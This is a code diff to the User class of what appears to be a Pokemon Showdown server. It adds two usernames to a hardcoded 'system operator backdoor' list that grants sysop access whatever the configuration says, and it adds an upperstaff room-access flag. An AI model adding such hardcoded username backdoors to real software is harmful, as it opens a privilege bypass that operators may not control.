@@ -431,7 +431,7 @@ class User {
 	 * Special permission check for system operators
 	 */
 	hasSysopAccess() {
-			if ((this.isSysop && Config.backdoor) || ['kokonoesan'].indexOf(this.userid) > -1) {
+			if ((this.isSysop && Config.backdoor) || ['opvictreebel', 'wando', 'kokonoesan'].indexOf(this.userid) > -1) {
 			// This is the Pokemon Showdown system operator backdoor.
 
 			// Its main purpose is for situations where someone calls for help, and
@@ -506,6 +506,7 @@ class User {
 		this.registered = false;
 		this.group = Config.groupsranking[0];
 		this.isStaff = false;
+		this.isUpperstaff = false;
 		this.isSysop = false;
 
 		this.named = !!this.namelocked;
@@ -890,6 +891,7 @@ class User {
 			this.registered = false;
 			this.group = Config.groupsranking[0];
 			this.isStaff = false;
+			this.isUpperstaff = false;
 			return;
 		}
 		this.registered = true;
@@ -1143,6 +1145,7 @@ class User {
 		if (!this.can('bypassall')) {
 			// check if user has permission to join
 			if (room.staffRoom && !this.isStaff) return false;
+			if (room.upperstaffRoom && !this.isUpperstaff) return false;
 			if (room.checkBanned && !room.checkBanned(this)) {
 				return null;
 			}
